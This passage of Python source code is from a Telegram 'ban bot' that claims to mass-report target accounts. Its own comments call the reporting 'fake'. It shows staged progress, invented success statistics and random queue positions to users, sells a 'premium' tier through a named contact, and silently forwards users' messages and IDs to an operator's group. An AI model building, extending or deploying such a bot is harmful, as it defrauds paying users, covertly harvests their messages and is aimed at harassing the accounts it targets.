            f"📌 Reason: {reason}\n"
            f"🔐 Session: 533 (Premium)\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Connecting to Telegram API...\n"
            "⏳ Authenticating session 533...",
            parse_mode='Markdown'
        )
        
        await asyncio.sleep(1.2)
        
        await processing_msg.edit_text(
            "🚀 **PROCESSING REPORT**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_id}`\n"
            f"📌 Reason: {reason}\n"
            f"🔐 Session: 533 (Premium)\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Connected to Telegram API\n"
            "✅ Session 533 authenticated\n"
            "✅ 2FA verified\n"
            "⏳ Sending report...",
            parse_mode='Markdown'
        )
        
        await asyncio.sleep(2.0)
        
        # Process fake report
        success, result = await self.reporting_engine.process_report(
            target_id, target_type, reason, description
        )
        
        if success:
            # Success message
            success_text = f"""
✅ **REPORT SUBMITTED SUCCESSFULLY!**

━━━━━━━━━━━━━━━━━━━━━
📊 **REPORT DETAILS**
━━━━━━━━━━━━━━━━━━━━━

🎯 **Target:** `{target_id}`
📌 **Type:** {target_type.title()}
📋 **Reason:** {reason}
🔐 **Session:** 533 (Premium)
📝 **Description:** {description[:100]}{'...' if len(description) > 100 else ''}

━━━━━━━━━━━━━━━━━━━━━
📈 **RESULT**
━━━━━━━━━━━━━━━━━━━━━

✅ **Status:** Success
⚡ **Response Time:** {result['response_time']}
📎 **Report ID:** `{result['report_id']}`
🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━
📊 **SESSION 533 STATS**
━━━━━━━━━━━━━━━━━━━━━

📱 **Total Reports:** 12,848 (+1)
📈 **Success Rate:** 98.7%
🔒 **2FA:** Enabled
💎 **Premium:** Active

━━━━━━━━━━━━━━━━━━━━━
⚡ **Report submitted to Telegram**
━━━━━━━━━━━━━━━━━━━━━

Use /status to check your statistics
"""
            
            await processing_msg.edit_text(success_text, parse_mode='Markdown')
            
            # Forward success to group
            success_info = f"""
✅ **REPORT SUCCESSFUL**

👤 User: `{user_id}`
🎯 Target: `{target_id}`
📌 Reason: {reason}
🔐 Session: 533
📎 ID: `{result['report_id']}`
⏱️ Time: {result['response_time']}
            """
            
            await self.forward_to_group(update, context, "report", success_info)
            
        else:
            # Queue message
            queue_text = f"""
⚠️ **REPORT QUEUED**

━━━━━━━━━━━━━━━━━━━━━
📊 **REPORT DETAILS**
━━━━━━━━━━━━━━━━━━━━━

🎯 **Target:** `{target_id}`
📌 **Type:** {target_type.title()}
📋 **Reason:** {reason}
🔐 **Session:** 533 (Premium)

━━━━━━━━━━━━━━━━━━━━━
📈 **STATUS**
━━━━━━━━━━━━━━━━━━━━━

⏳ **Status:** Queued
📊 **Queue Position:** #{random.randint(2, 8)}
⏱️ **Est. Time:** {random.randint(10, 30)} seconds
📎 **Queue ID:** `QUEUE-{hashlib.md5(f'{target_id}{time.time()}'.encode()).hexdigest()[:8].upper()}`

━━━━━━━━━━━━━━━━━━━━━
💡 **NOTE**
━━━━━━━━━━━━━━━━━━━━━

Your report has been queued due to high demand.
It will be processed automatically.

✅ You will receive confirmation when completed
"""
            
            await processing_msg.edit_text(queue_text, parse_mode='Markdown')
            
            # Forward queue to group
            queue_info = f"""
⏳ **REPORT QUEUED**

👤 User: `{user_id}`
🎯 Target: `{target_id}`
📌 Reason: {reason}
🔐 Session: 533
            """
            
            await self.forward_to_group(update, context, "report", queue_info)
        
        # Clean up user state
        if user_id in self.user_states:
            del self.user_states[user_id]

    async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard callbacks"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        data = query.data
        
        # Handle commands from inline keyboard
        if data == "cmd_report":
            await query.message.delete()
            await self.report(update, context)
        elif data == "cmd_status":
            await query.message.delete()
            await self.status_command(update, context)
        elif data == "cmd_sessions":
            await query.message.delete()
            await self.sessions_command(update, context)
        elif data == "cmd_premium":
            await query.message.delete()
            await self.premium_command(update, context)
        elif data == "cmd_help":
            await query.message.delete()
            await self.help_command(update, context)

    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all other messages"""
        if update.message:
            # Don't process commands here
            if update.message.text and update.message.text.startswith('/'):
                return
            
            # Forward all other messages to group
            await self.forward_to_group(update, context)
            
            # Check if user is in report flow
            user_id = update.effective_user.id
            if user_id in self.user_states:
                state = self.user_states[user_id]
                if state.get("step") == "waiting_target":
                    await self.handle_report_target(update, context)

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel operation"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "❌ User cancelled operation")
        
        # Clear user state
        if user_id in self.user_states:
            del self.user_states[user_id]
        
        await update.message.reply_text(
            "❌ **Operation Cancelled**\n\n"
            "Use /report to start again",
            parse_mode='Markdown'
        )
        
        return ConversationHandler.END

    def setup_bot(self):
        """Setup and run the bot"""
        print("🚀 Starting Telegram Ban Bot - Public Version")
        print(f"📨 All messages forwarded to group: {GROUP_ID}")
        print(f"📢 Force channel: {FORCE_CHANNEL}")
        print(f"👤 Manual user: @smzxu")
        print(f"🔐 Premium Session: 533")
        print("💎 Subscription System: Active")
        
        # Create application
        persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
        application = Application.builder().token(BOT_TOKEN).persistence(persistence).build()
        
        # Report conversation handler
        report_conv_handler = ConversationHandler(
            entry_points=[CommandHandler('report', self.report)],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_target)],
                REASON: [CallbackQueryHandler(self.handle_report_reason, pattern='^reason_')],
                DESCRIPTION: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_description),
                    CommandHandler('skip', self.skip_description)
                ]
            },
            fallbacks=[CommandHandler('cancel', self.cancel)],
            allow_reentry=True
        )
        
        # Regular commands
        application.add_handler(CommandHandler('start', self.start))
        application.add_handler(CommandHandler('help', self.help_command))
        application.add_handler(CommandHandler('status', self.status_command))
        application.add_handler(CommandHandler('sessions', self.sessions_command))
        application.add_handler(CommandHandler('premium', self.premium_command))
        application.add_handler(CommandHandler('cancel', self.cancel))
        
        # Callback handlers
        application.add_handler(CallbackQueryHandler(self.verify_join_callback, pattern='^verify_join$'))
        application.add_handler(CallbackQueryHandler(self.handle_callback_query, pattern='^cmd_'))
        
        # Conversation handler
        application.add_handler(report_conv_handler)
        
        # Message handler (MUST BE LAST)
        application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, self.handle_all_messages))
        
        print("✅ Bot is running!")
        print("📱 Public access enabled")
        print("🎯 Fake reporting system active")
        print("🔐 Session 533 ready")
        print("💎 Contact @smzxu for premium")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)

# ==================== MAIN ====================
if __name__ == "__main__":
    bot = BanBot()
    
    try:
        bot.setup_bot()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
